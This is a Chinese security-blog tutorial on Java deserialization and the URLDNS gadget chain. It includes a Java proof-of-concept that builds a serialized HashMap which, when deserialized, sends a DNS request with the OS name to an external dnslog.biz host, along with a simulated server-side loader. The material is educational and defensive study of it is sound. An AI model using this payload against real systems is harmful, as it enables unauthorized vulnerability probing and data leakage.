---
title: Java序列化基础-URLDNS利用
url: https://www.freebuf.com/articles/web/397023.html
source: FreeBuf网络安全行业门户
date: 2024-05-31
fetch_date: 2025-10-06T16:51:03.967939
---

# Java序列化基础-URLDNS利用

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

Java序列化基础-URLDNS利用

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

Java序列化基础-URLDNS利用

2025-06-17 10:56:36

所属地 河南省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## 0x01 序列化概念

公众号:bGl1安全
序列化是指将一个对象转换为一个字节序列（包含`对象的数据`、`对象的类型`和`对象中存储的属性`等信息），以便在网络上传输或保存到文件中，或者在程序之间传递。在 Java 中，序列化通过实现 java.io.Serializable 接口来实现，只有实现了 **Serializable**接口的**对象**才能被序列化。

#**注意**#

* 序列化的是对象而不是类。
* static静态属性不能序列化,because :由于静态变量属于一个类,静态变量只在类加载的时候获取一次内存空间存储在静态区的，所以不要通过对象引用来访问，而应该直接通过类名来访问，否则编译器会发出警告
  ![img](https://image.3001.net/images/20240406/1712394519_66111117cc50faf573c41.png!small)
* Transient瞬态不能被序列化

#### 序列化

(1) 能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将从内存中要序列化的数据通过**输出流**保存在文件中。

(2) 利用序列化实现远程通信，在网络上传送对象的字节序列。

#### 反序列化

是序列化的逆过程,将字节流转换回对象的过程。在反序列化过程中，会开启**输入流**通道,Java从字节流中的信息重构对象，并将其重新加载到内存中。

#什么是输入输出流: https://javabetter.cn/io/serialize.html#\_01%E3%80%81objectoutputstream

```
序列化：对象 -> 字符串
反序列化：字符串 -> 对象
```

## 0x02 为什么会产生反序列化漏洞

引用其他师傅的一句话: 只要服务端反序列化数据，客户端传递类的`readObject`中代码会自动执行，基于攻击者在服务器上运行代码的能力。

```
简单来说:readObject的方法中有被攻击利用的漏洞即代码,服务端拿到这个代进行反序列化自动调用readObject运行危险代码,让攻击者达到利用漏洞的目的
```

反序列化漏洞是从readObject()开始

#### 反序列化利用可能的几种形式

1. 入口类的readObject直接调用危险方法(不常见)
2. 入口类参数中包含可控类,该可控类有危险方法,被反序列化时被readObject方法调用(不常见)
3. 入口参数中包含可控类,该可控类由调用其他含有危险方法的类,被反序列化时被readObject方法调用(常见)
4. 构造函数/静态代码块等类加载时隐式执行

```
注意
 # 利用的前提是利用链里的类是继承Serializable
 # 这里的危险方法一般不是指该可控类的方法有危险,而是指该可控类的方法与要利用的危险方法是同名函数且类型相同
```

## 0x03 URLDNS链举例说明

#### 前言

需要知识:

1. 反射
2. 动态代理

这里只需知道反射与动态代理有什么用就行#建议深度学习常见的反序列化漏洞都要用到反射

URLDNS链一般是学习java反序列化漏洞的第一条Gadget Chain利用链因为

1. URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用
2. 不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求
3. 目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞

```
简单来说:java原生类好找,简单好利用
```

#### 原理

java.util.HashMap实现了Serializable接口，重写了readObject, 在反序列化时会调用hash函数计算key的hashCode，而java.net.URL实现了Serializable的接口,它的hashCode在计算时会调用getHostAddress的来解析域名, 从而发出DNS请求

#### 目的

序列化时不请求DNS,反序列化时请求DNS为什么

如何做到呢?

因为序列化便于传输,poc要序列化成文件进行传输而服务端拿到文件需要进行反序列化,攻击者的目的就行让服务端执行代码造成漏洞当然URLDNS链没有太大危害,可以用来获取一些信息如系统版本

要怎样做呢?

hashCode序列化时值不等于-1不进行直接返回hashCode不进行下一步,反序列化时hashCode值等于-1在根据调用链运行,进行DNS请求

![image-20240406102010082](https://image.3001.net/images/20240406/1712394524_6611111cba9b0207d3b68.png!small)![image-20240406102011335](https://image.3001.net/images/20240406/1712394529_66111121691489dcf8b02.png!small)

#### 分析过程

首先看URLDNS的Gadget Chain:

```
HashMap.readObject()

  -->HashMap.hash(URL)

	-->URL.hashCode()的handler.hashCode即URLStreamHandler.hashCode()

	  -->URLStreamHandler.hashCode()

        -->URLStreamHandler.etHostAddress()

          -->InetAddress.getByName()
```

在idea可以看出HashMap与URL都继承了Serializable的接口

![image-20240404165709802](https://image.3001.net/images/20240406/1712394532_661111248f714b44bb303.png!small)

![image-20240404165643187](https://image.3001.net/images/20240406/1712394536_66111128537d5249a2742.png!small)

可控类的方法与要利用的危险方法是同名函数且类型相同如HashMap.readObject的hash的hashCode与与URL的hashCode

![image-20240404170224453](https://image.3001.net/images/20240406/1712394539_6611112ba479a0a44c51a.png!small)

![image-20240404171416103](https://image.3001.net/images/20240406/1712394544_6611113075b2bb69f5b28.png!small)

测试代码

```
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

public class UrlDns {
    public static void serializable(Object obj) throws Exception {
        FileOutputStream fileOut = new FileOutputStream("hashmap.txt");
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        out.writeObject(obj);
        out.close();
        fileOut.close();
    }
    public static void unserializable() throws Exception {
        FileInputStream filein = new FileInputStream("hashmap.txt");
        ObjectInputStream inputStream = new ObjectInputStream(filein);
        Object o =inputStream.readObject();
        System.out.println(o);
        filein.close();
        inputStream.close();

    }
    public static void main(String[] args) throws Exception {
//   	String osname = System.getProperty("os.name");
//		osname = osname.replace(" ","-");//获取当前电脑的版本
        HashMap<URL, Integer> hashMap=new HashMap<URL, Integer>();
        URL url=new URL("http://"+osname+".82bd0d3b.dnslog.biz");
        Date nowTime = new Date();
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        Field filed = Class.forName("java.net.URL").getDeclaredField("hashCode");
//        Class<? extends URL> aClass = url.getClass(); //<? extends URL>: Class<?>匹配任意类型的类 extends URL指定是URl类下的子类型
        filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限,意味着即使字段是private与protected，也可以在其他类中进行访问
        filed.set(url, 8888);
        hashMap.put(url, 23);
        System.out.println("当前时间为: " + simpleDateFormat.format(nowTime));
        filed.set(url, -1);
        serializable(hashMap);
//        unserializable();
    }
}
```

代码分析: 测试类名为UrlDns,将序列化与反序列化封装成函数,url对象存储DNS地址,nowTime记录当前时间便于观察是否触发了利用链,filed通过反射获取运行时的URL类的hashCode的方法将其存储,filed.set(url, 0)将url对象的hashCode值设置为0,利用hashMap的put方法去触发hash方法调用的hashCode启动利用链

#### 进行调试

```
这里打断点调试从put一步步跟进到put和hash这里函数会接收很多参数调试很慢,观察Gadget Chain有一个类似递归回溯的过程如果我在hashCode这里打断点进行step out 步出函数会进行向前回溯且key是URL对象
```

Ctrl+鼠标左键进入hashMap.put

![image-20240406095343184](https://image.3001.net/images/20240406/1712394549_66111135213eb035087a0.png!small)

进入hash方法

![image-20240406095337577](https://image.3001.net/images/20240406/1712394552_661111385485023bc8ad9.png!small)

跟进hashCode方法这里的hashCode为8888是filed对象反射设置的,直接返回hashCode值好达成序列化时不进行DNS请求

![image-20240406100713892](https://image.3001.net/images/20240406/1712394556_6611113cd7ac37414dc56.png!small)

![image-20240406095334429](https://image.3001.net/images/20240406/1712394560_6611114073f5743254c71.png!small)![](https://image.3001.net/images/20240406/1712394564_66111144c7aed9117b63b.png!small)

在将hashCode设置为-1,达成反序列化时进行DNS请求的目的

![image-20240406095347344](https://image.3001.net/images/20240406/1712394569_661111495c34358564084.png!small)

本地模拟服务端运行反序列代码

这里的hashmap.txt真实环境中需要你上传

```
import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Date;

public class UrlDns {
    public static void unserializable() throws Exception {
        FileInputStream filein = new FileInputStream("./hashmap.txt");
        ObjectInputStream inputStream = new ObjectInputStream(filein);
        Object o =inputStream.readObject();
        filein.close();
        inputStream.close();

    }
    public static void main(String[] args) throws Exception {
    	Date nowTime = new Date();
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        System.out.println("当前时间为: " + simpleDateFormat.format(nowTime));
     	unserializable();

    }
}
```

这里是序列化时的结果

![image-20240406101230267](https://image.3001.net/images/20240406/1712394573_6611114dea2fb6bb757a3.png!small)

![image-202404060953491...